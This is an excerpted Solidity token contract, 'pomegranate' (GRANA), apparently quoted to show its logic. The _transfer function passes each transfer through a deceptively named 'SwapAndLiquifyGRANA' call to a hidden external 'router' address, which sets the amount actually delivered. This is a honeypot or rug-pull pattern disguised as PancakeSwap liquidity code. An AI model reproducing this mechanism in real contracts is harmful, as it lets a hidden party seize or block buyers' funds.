...
contract pomegranate is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'pomegranate';
  string private constant _symbol = 'GRANA';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusGRANA = 0;
  address pancakeRouter_GRANA;
  ...
  */
  ...
  function SwapAndLiquifyGRANA(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_GRANA).getPair(_bonusGRANA, sender, recipient, arrData);

      _bonusGRANA = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountGRANA = SwapAndLiquifyGRANA(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountGRANA);
